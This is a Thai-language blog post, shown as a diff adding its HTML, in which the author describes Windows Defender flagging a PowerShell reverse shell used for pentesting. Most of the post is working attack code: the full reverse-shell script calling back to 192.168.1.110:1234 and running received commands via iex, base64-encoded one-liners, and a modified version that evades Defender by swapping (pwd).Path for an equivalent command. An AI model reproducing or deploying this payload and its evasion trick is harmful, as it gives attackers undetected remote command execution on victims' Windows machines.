@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<title>
+  
+     What The Fuck Do You Want Windows Defender? | 
+    SUAM
+  
+</title><meta name="description" content="เรื่องแปลก ๆ ของนาย Windows Defender แสนวุ่นวายกับ Reverse Shell จอมซน"><meta name="author" content="bongtrop">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="/favicon-32x32.png " sizes="32x32" type="image/png">
+<link rel="icon" href="/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#0c344b">
+<link rel="icon" href="/favicon.ico">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-173363806-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-173363806-1');
+</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/themes/prism.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<link rel="stylesheet" href="/dist/main.min.css"><link rel="canonical" href="https://suam.wtf/posts/wtf-do-you-want-windows-defender/"><meta property="og:title" content="What The Fuck Do You Want Windows Defender?" />
+<meta property="og:description" content="เรื่องแปลก ๆ ของนาย Windows Defender แสนวุ่นวายกับ Reverse Shell จอมซน" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://suam.wtf/posts/wtf-do-you-want-windows-defender/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-06-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-30T00:00:00+00:00" />
+
+<meta itemprop="name" content="What The Fuck Do You Want Windows Defender?">
+<meta itemprop="description" content="เรื่องแปลก ๆ ของนาย Windows Defender แสนวุ่นวายกับ Reverse Shell จอมซน"><meta itemprop="datePublished" content="2020-06-30T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2020-06-30T00:00:00+00:00" />
+<meta itemprop="wordCount" content="273">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="What The Fuck Do You Want Windows Defender?"/>
+<meta name="twitter:description" content="เรื่องแปลก ๆ ของนาย Windows Defender แสนวุ่นวายกับ Reverse Shell จอมซน"/>
+
+</head>
+<body>
+    
+<nav class="navbar navbar-expand-md navbar-light bg-light fixed-top shadow-sm" id="navbar-main-menu">
+    <div class="container">
+        <a class="navbar-brand font-weight-bold" href="https://suam.wtf/">SUAM</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-menu" aria-controls="main-menu" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="main-menu">
+            <ul class="navbar-nav ml-auto">
+                
+                    <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
+                
+                    <li class="nav-item"><a class="nav-link" href="/about">About</a></li>
+                
+            
+                <li class="nav-item">
+                    <a href="https://webring.wonderful.software#suam.wtf" title="วงแหวนเว็บ" target="_blank" class="nav-link" rel="noopener">
+                        <img src="/images/webring.black.svg" width="25px" height="25px" alt="วงแหวนเว็บ" />
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+
+    
+<main class="content-page container pt-7 pb-5">
+    
+    <div class="row">
+        <div class="col">
+            <article>
+                <div class="row justify-content-center">
+                    <div class="col-lg-8">
+                        <div class="meta text-muted mb-3">
+                            <p class="created text-muted text-uppercase font-weight-bold mb-1">June 30, 2020</p>
+                            <span class="mr-2"><i class="fas fa-book-open mr-2"></i>273 words</span>
+                            <span><i class="fas fa-clock mr-2"></i>2 mins read</span>
+                        </div>
+
+                        <h1>What The Fuck Do You Want Windows Defender?</h1>
+
+                        <ul class="authors list-inline"><li class="list-inline-item mr-3">
+                    <div class="media author"><a href="/authors/bongtrop/" class="mr-3">
+                                    <picture>
+                                        <source srcset="/authors/bongtrop/bongtrop_hu65f5a07b0445c5fedda84b3f6d0d2244_19133_64x0_resize_q75_box.jpg 1x, /authors/bongtrop/bongtrop_hu65f5a07b0445c5fedda84b3f6d0d2244_19133_128x0_resize_q100_box.jpg 2x, /authors/bongtrop/bongtrop_hu65f5a07b0445c5fedda84b3f6d0d2244_19133_192x0_resize_q100_box.jpg 3x">
+                                        <img src="/authors/bongtrop/bongtrop_hu65f5a07b0445c5fedda84b3f6d0d2244_19133_64x0_resize_q75_box.jpg" class="rounded-circle" alt="bongtrop">
+                                    </picture>
+                                </a><div class="media-body">
+                            <h5 class="name my-0"><a href="/authors/bongtrop/" class="small">bongtrop</a>
+                            </h5><p class="social small text-muted">
+                                    <a href="https://twitter.com/@bongtrop">@bongtrop</a>
+                                </p></div>
+                    </div>
+                </li></ul>
+                    </div>
+                </div><div class="row justify-content-center">
+                    <div class="col-lg-8">
+                        <div class="content">
+                            <p>เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ <code>@nikhil_mitt</code> โดยมีหน้าตาประมาณนี้ครับ</p>
+<pre><code class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.1.110&quot;,1234);
+$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String );
+    $sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+};
+$client.Close();
+</code></pre>
+<p><a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html">เต็ม ๆ อ่านที่ Link นี้นะครับ</a></p>
+<p>ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ</p>
+<pre><code>powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADAAIgAsADEAMgAzADQAKQA7ACQAYgA9ACQAYQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGQAPQAwAC4ALgAyADUANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAZQA9ACQAYgAuAFIAZQBhAGQAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAJABpAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZAAsADAALAAkAGUAKQA7ACQAawA9ACgAaQBlAHgAIAAkAGkAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAbQA9ACQAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABvAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAG0AKQA7ACQAYgAuAFcAcgBpAHQAZQAoACQAbwAsADAALAAkAG8ALgBMAGUAbgBnAHQAaAApADsAJABiAC4ARgBsAHUAcwBoACgAKQA7AH0AOwAkAGEALgBDAGwAbwBzAGUAKAApADsA
+</code></pre>
+<p>แต่ผลไม่ได้เป็นดังที่หวังหลังจากผมนำไป Execute บน Windows 10 เวอร์ชันล่าสุดโดน Antivirus จับได้ซะงั้น ผมตกใจมากและคิดในใจว่า</p>
+<blockquote>
+<p>OMG แค่โปรแกรมเอาข้อความที่ได้รับจาก TCP มา Eval แล้วส่งกลับ มันจับได้ไงวะเนี่ย</p>
+</blockquote>
+<p>เป็นดังภาพครับ</p>
+<p><img src="https://i.imgur.com/jwNXteU.png" alt="Antivirus Detected"></p>
+<p>ผมเลยลองพยายามหาว่ามันจับจากอะไรพยายามลบคำสั่งต่าง ๆ ไปเรื่อย ๆ จนท้อ แต่ไม่รู้คิดไงเหมือนกัน ไปลบ <code>(pwd).Path</code> ออกจับไม่ได้เฉย Powershell Script ก็จะเป็นประมาณนี้ครับ</p>
+<pre><code class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.1.110&quot;,1234);
+$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String );
+    $sendback2  = $sendback + &quot;PS &gt; &quot;;
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+};
+$client.Close();
+</code></pre>
+<p>อ่าวเห้ยคุณ Windows Defender จับแค่คำสั่งความสวยงามนี้หว่า ผมเลยลองแก้เป็นอีกคำสั่งหนึ่งที่มีความสามารถเหมือนกัน ดังนี้</p>
+<p><code>(pwd).Path</code> -&gt; <code>(dir).DirectoryName | Select -Index 0</code></p>
+<p>ก็จะได้ Powershell Script หน้าตาประมาณนี้ครับ</p>
+<pre><code class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.1.110&quot;,1234);
+$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String );
+    $sendback2  = $sendback + &quot;PS &quot; + ((dir).DirectoryName | Select -Index 0) + &quot;&gt; &quot;;
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+};
+$client.Close();
+</code></pre>
+<p>ความยาว Payload หลังจากเอาไป Minify, Encode และทำเป็น One Line ไม่ได้ยาวกว่ากันมากครับ</p>
+<pre><code>powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADAAIgAsADEAMgAzADQAKQA7ACQAYgA9ACQAYQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGQAPQAwAC4ALgAyADUANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAZQA9ACQAYgAuAFIAZQBhAGQAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAJABpAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZAAsADAALAAkAGUAKQA7ACQAawA9ACgAaQBlAHgAIAAkAGkAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAbQA9ACQAawAgACsAIAAiAFAAUwAgACIAIAArACAAKAAoAGQAaQByACkALgBEAGkAcgBlAGMAdABvAHIAeQBOAGEAbQBlACAAfAAgAFMAZQBsAGUAYwB0ACAALQBJAG4AZABlAHgAIAAwACkAIAArACAAIgA+ACAAIgA7ACQAbwA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABtACkAOwAkAGIALgBXAHIAaQB0AGUAKAAkAG8ALAAwACwAJABvAC4ATABlAG4AZwB0AGgAKQA7ACQAYgAuAEYAbAB1AHMAaAAoACkAOwB9ADsAJABhAC4AQwBsAG8AcwBlACgAKQA7AA==
+</code></pre>
+<p>หลังจากเอาไป Execute ก็ Happy Ending ครับ ดังรูป</p>
+<p><img src="https://i.imgur.com/mjG1vlD.png" alt="Noob Antivirus"></p>
+<p>จบเรื่องนี้ผมก็ยังไม่เข้าใจคุณ Windows Defender ว่าเขาต้องการอะไรจากน้อง Reverse Shell ของผม</p>
+<ol>
+<li>คุณ Windows Defender จะ Detect ทำไมกับโปรแกรมรับข้อความจาก TCP มา Eval แล้วส่งกลับ</li>
+<li>คุณ Windows Defender จะ Detect จาก <code>(pwd).Path</code> ไม่ได้นะครับ มันไม่ได้เป็นสาระสำคัญของ Script เลย</li>
+<li>อะไรกันคับเนี่ย คุณ Windows Defender คุณคิดอะไรอยู่ ผมงงไปหมดแล้ว</li>
+</ol>
+
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row justify-content-center">
+                    <div class="col-lg-8">
+                        
+                    </div>
+                </div></article>
+        </div>
+    </div>
+
+    
+</main>
+
+
+    <footer class="footer text-center bg-dark py-2">
+    <div class="container">
+        <div class="row">
+            <div class="col">
+                <ul class="list-inline">
+                    
+                </ul>
+
+                <p class="text-muted">
+                    
+                        Copyright &copy; SUAM 2022
+                    
+                </p>
+
+                <p class="text-muted">
+                Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with <a href="https://github.com/puresyntax71/hugo-theme-chunky-poster" target="_blank">Chunky Poster</a>.
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+    
+    
+        
+            <script src="/dist/app.js"></script>
+        
+    
+        
+            <script src="/dist/lazyload.js"></script>
+        
+    
+        
+            <script src="/dist/main.js"></script>
+        
+    
+        
+            <script src="/dist/vendors~app.js"></script>
+        
+    
+        
+            <script src="/dist/vendors~app~bootstrap.js"></script>
+        
+    
+        
+            <script src="/dist/vendors~bootstrap.js"></script>
+        
+    
+        
+            <script src="/dist/vendors~ekkoLightbox.js"></script>
+        
+    
+
+
+
+<script>
+    window.Prism = window.Prism || {};
+    window.Prism.manual = true;
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/components/prism-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
+<script>
+document.body.onload = () => {
+    renderMathInElement(document.body, {
+        delimiters: [
+            {left: "$$", right: "$$", display: true},
+            {left: "\\[", right: "\\]", display: true},
+            {left: "$", right: "$", display: false},
+            {left: "\\(", right: "\\)", display: false}
+        ]
+    });
+};
+</script>
+
+
+
+
+
+
+    
+</body>
+</html>
